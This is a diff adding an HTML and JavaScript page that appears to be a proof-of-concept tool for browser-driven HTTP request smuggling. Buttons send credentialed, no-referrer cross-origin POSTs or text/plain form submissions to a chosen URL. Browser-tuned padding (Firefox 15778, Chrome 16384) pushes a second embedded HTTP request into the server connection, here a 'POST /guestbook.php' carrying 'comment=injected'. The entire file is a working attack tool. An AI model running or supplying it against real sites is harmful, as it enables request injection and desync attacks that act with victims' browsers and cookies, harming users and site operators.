@@ -1,0 +1,103 @@
+<button onclick="dynamicRequest()">Send Fetch</button>
+<button onclick="dynamicFormRequest()">Send Form request</button>
+<button onclick="redir()">JS Redirect</button>
+<hr>
+<br>
+URL: 
+<input id="url" value="https://b.com:1234/fake"></input>
+<br>
+
+<br>
+POST Body Padding Fetch: 
+<input id="lenpadding" value="15889"></input>
+<br>
+POST Body Padding form:<br>
+Firefox: 15778<br>
+Chrome: 16384<br>
+<input id="lenpaddingForm" value="16384"></input>
+<br>
+<br>
+POST Body:
+<br>
+<textarea id="payload" rows="10" cols="50">
+POST /guestbook.php HTTP/1.1
+content-type: application/x-www-form-urlencoded
+Connection: keep-alive
+Host: localhost
+Content-Length: 16
+
+comment=injected</textarea><br>
+<span id="payloadlength"></span>
+
+
+
+
+<script>
+
+
+    const sleep = (ms) =>{
+        return new Promise(resolve => setTimeout(resolve, ms));
+    }
+
+    const dynamicRequest = async () => {
+        let len = document.getElementById('lenpadding').value
+        let payload = document.getElementById('payload').value
+        let url = document.getElementById('url').value
+
+        let r = await fetch(url, {
+            method: 'POST',
+            credentials: 'include',
+            mode: 'no-cors',
+            referrerPolicy: 'no-referrer',
+            body: `${'A'.repeat(len)}${payload}`.replace(/\n/g, '\r\n'),
+        })
+        
+        console.log(r)
+    }
+
+    const dynamicFormRequest = async () => {
+        let len = document.getElementById('lenpaddingForm').value
+        let payload = document.getElementById('payload').value
+        let url = document.getElementById('url').value
+
+        let f = document.createElement('form')
+        f.method = 'POST'
+        f.action = url
+
+        f.target = 'mitb'
+        f.enctype = 'text/plain'
+        target = 'mitb'
+
+        let i = document.createElement('input')
+        i.name = `${'A'.repeat(len)}${payload}`.replace(/\n/g, '\r\n')
+        i.value = ''
+        f.appendChild(i)
+
+
+        document.body.appendChild(f)
+        f.submit()
+    }
+
+
+
+    const redir = async () => {
+        location = document.getElementById('url').value
+    }
+
+    const payloadLength = async () => {
+        let payload = document.getElementById('payload').value
+        document.getElementById('payloadlength').innerText = `Payload length: ${payload.length}`
+    }
+    payloadLength()
+    document.getElementById('payload').addEventListener('change', payloadLength)
+
+
+        
+
+
+
+        
+    
+
+
+</script>
